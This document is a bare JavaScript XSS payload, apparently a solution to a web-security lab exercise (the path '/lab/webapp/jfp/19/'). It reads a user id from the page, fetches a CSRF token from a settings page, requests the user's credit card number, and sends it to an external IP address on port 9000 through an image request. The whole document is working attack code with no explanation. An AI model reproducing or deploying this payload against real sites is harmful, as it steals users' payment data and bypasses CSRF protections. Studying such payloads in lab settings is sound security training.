<script>

var link = document.getElementById("settings");

var req = new XMLHttpRequest();

var csrf_token = '';

var uid = '';

var req2 = new XMLHttpRequest();

req2.onreadystatechange = function () {
if (req2.readyState == 4 && req2.status == 200 )
 {
 var htmlPage = req2.responseXML;
 
 credit_card = htmlPage.getElementById("result").innerHTML;
 
 document.getElementById("result").innerHTML = credit_card;
 
 new Image().src = "http://172.105.54.23:9000/?credit_card_number="+credit_card;

 }
};

req.onreadystatechange = function () {
if (req.readyState == 4 && req.status == 200 )
  {
  var htmlPage = req.responseXML;
  
  csrf_token = htmlPage.forms[0].elements[1].value;
 
  alert(csrf_token);
  
  req2.open("GET", "/lab/webapp/jfp/19/getcreditcard?uid="+uid+"&csrf_token="+csrf_token, true);
  req2.responseType = "document";
  req2.send();
  
  }
};

uid = link.innerHTML.split(':')[1];

req.open("GET", link.href, true);
req.responseType = "document";
req.send();

</script>
